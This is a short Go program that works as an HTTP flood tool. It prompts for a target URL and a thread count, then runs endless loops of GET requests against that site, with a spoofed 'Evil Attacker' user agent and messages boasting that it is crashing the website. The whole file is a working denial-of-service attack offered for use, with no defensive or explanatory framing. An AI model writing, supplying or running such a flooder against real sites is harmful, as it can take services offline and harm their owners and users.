package main

import (
	"fmt"
	"net/http"
	"sync"
	"time"
)

func crash() {
	var wg sync.WaitGroup
	var targetURL string
	var numThreads int

	// Input URL and number of threads
	fmt.Println("Enter the target URL:")
	fmt.Scanln(&targetURL)
	fmt.Println("Enter the number of concurrent threads:")
	fmt.Scanln(&numThreads)

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				transport := &http.Transport{
					DisableKeepAlives: true, // Prevents leaving connections open
					MaxIdleConns:      0,    // Set to 0 to close idle connections immediately
				}
				client := &http.Client{
					Transport: transport,
					Timeout:   time.Second * 5, // Set a timeout to prevent hanging
				}
				req, _ := http.NewRequest("GET", targetURL, nil) // Ignore errors for diabolical efficiency
				req.Header.Set("User-Agent", "Evil Attacker")    // Spoofing user agent
				client.Do(req)
				fmt.Println("Starting to crash website 😈")
			}
		}()
		time.Sleep(10 * time.Millisecond) // Increase the speed of thread creation
	}

	wg.Wait() // This line ensures the program never exits
}

func main() {
	crash()
}
